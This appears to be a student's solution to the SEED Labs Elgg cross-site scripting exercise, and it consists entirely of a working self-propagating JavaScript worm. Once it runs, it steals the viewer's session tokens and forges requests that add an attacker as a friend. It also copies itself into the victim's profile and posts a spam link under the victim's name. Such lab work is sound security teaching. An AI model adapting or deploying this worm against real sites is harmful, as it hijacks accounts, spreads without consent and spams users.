<script id="worm" type="text/javascript">

	
	window.onload = function(){
	//Task 1
	
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var name = elgg.session.user.name;
	var guid = elgg.session.user.guid;
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	
	//Construct the HTTP request to add Samy as a friend.

	var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token; //FILL IN

	//Create and send Ajax request to add friend
	if(guid != 59){
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	
	

	//Task 2
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token

	
	
	//Construct the content of your url.
    sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content = token+ts+"&name="+name+"&description=Ulta+Palta+About+me&accesslevel[description]=1&briefdescription=1905006"+wormCode+"&accesslevel[briefdescription]=1&location=Ulta+Palta+Location&accesslevel[location]=1&interests=Ulta+Palta+Interest&accesslevel[interests]=1&skills=Ulta+Palta+Skill&accesslevel[skills]=1&contactemail=UltaPaltaEmail%40gmail.com&accesslevel[contactemail]=1&phone=Ulta+Palta+Telephone&accesslevel[phone]=1&mobile=Ulta+Palta+Mobile+Phone&accesslevel[mobile]=1&website=http%3A%2F%2Fwww.UltaPaltaWebsite.com&accesslevel[website]=1&twitter=Ulta+Palta+Twitter+Username&accesslevel[twitter]=1&guid="+guid; //FILL IN
	
	if(guid != 59)
	{
		//Create and send Ajax request to modify profile
		Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}


    sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
	content = token+ts+"&body=To%20earn%2012%20USD%2Fhour%28%21%29%20%2C%20visit%20now%20http%3A%2F%2Fwww.seed-server.com%2Fprofile%2F"+name; //FILL IN
	
	if(guid != 59)
	{
		//Create and send Ajax request to modify profile
		Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
	
</script>
